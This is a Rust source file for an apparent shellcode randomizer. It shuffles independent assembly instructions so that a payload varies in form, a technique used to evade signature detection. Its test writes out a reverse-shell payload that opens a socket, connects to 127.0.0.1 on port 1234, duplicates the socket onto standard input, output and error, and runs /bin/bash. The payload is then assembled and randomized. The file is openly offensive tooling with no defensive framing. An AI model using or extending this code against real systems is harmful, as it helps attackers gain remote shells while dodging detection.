extern crate rand;

use std::collections::HashMap;
use std::ptr::hash;
use crate::lexer::token::Instruction;
use std::time::Instant;
use rand::Rng;

mod lexer;
mod compiler;

struct Randomizer {
    pub registers: HashMap<String, bool>,
}

impl Randomizer {

    fn get_used_registers(&self) -> Vec<String> {
        let mut register_used = Vec::new();

        for (register, is_used) in self.registers.clone() {
            if is_used.to_owned() {
                register_used.push(register.to_owned());
            }
        }

        register_used
    }

    fn is_used_registers(&self, instruction_registers: &Vec<String>) -> bool {
        let used_registers = self.get_used_registers();
        let mut is_used = true;

        for register in instruction_registers {
            if !used_registers.contains(register) {
                is_used = false;
            }
        }

        return is_used;
    }

    fn randomize_instructions(&mut self, instructions: Vec<Instruction>) -> Vec<Instruction> {
        let mut rng = rand::thread_rng();
        let mut new_instructions = Vec::new();
        let reserved_registers = vec!["rsp".to_string(), "rip".to_string(), "rbp".to_string()];

        let mut instructions_iter = instructions.iter();

        while let Some(instruction) = instructions_iter.next() {
            let mut next_iter = instructions_iter.clone();

            if let Some(next_instruction) = next_iter.next() {
                if self.is_used_registers(&next_instruction.used_registers) &&
                    !self.get_used_registers().contains(&next_instruction.result_register) &&
                    !next_instruction.used_registers.contains(&instruction.result_register) &&
                    rng.gen_range(0, 2) == 0 {
                    if let Some(next_instruction) = instructions_iter.next() {
                        self.registers.insert(next_instruction.result_register.clone(), true);

                        new_instructions.push(next_instruction.to_owned());
                    }
                }
            }

            for register in instruction.used_registers.clone() {
                println!("release register: {}", &register);
                self.registers.insert(register, false);
            }

            println!("borrow register: {}", &instruction.result_register);

            self.registers.insert(instruction.result_register.clone(), true);

            new_instructions.push(instruction.to_owned());
        }

        new_instructions
    }
}

#[cfg(test)]
mod test {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn test_parse() {
        let asm = "\
        R9 = SYSCALL SOCKET 2 1 6\n\
        SYSCALL CONNECT R9 sockaddr_in{127.0.0.1,1234,2} 16\n\
        SYSCALL DUP2 R9 0\n\
        SYSCALL DUP2 R9 1\n\
        SYSCALL DUP2 R9 2\n\
        SYSCALL EXECVE \"/bin/bash\" 0 0\n\
        SYSCALL EXIT 0\
        ";

        let mut shellcode= Vec::new();

        let mut randomizer = Randomizer {
            registers: HashMap::new()
        };

        for line in asm.lines().into_iter() {
            let tokens = Box::new(lexer::parse_line(line.split_whitespace().collect()));

            if let Ok(mut instructions) = compiler::assemble_assignation(tokens.clone()) {
                shellcode.append(&mut randomizer.randomize_instructions(instructions));
            } else if let Ok(mut instructions) = compiler::assemble_syscall(tokens) {
                shellcode.append(&mut randomizer.randomize_instructions(instructions));
            } else {
                println!("Unknow line: {}", line);
            }
        }

        for line in shellcode {
            println!("{} {}", line.mnemonic, line.operands.join(", "));
        }
    }
}
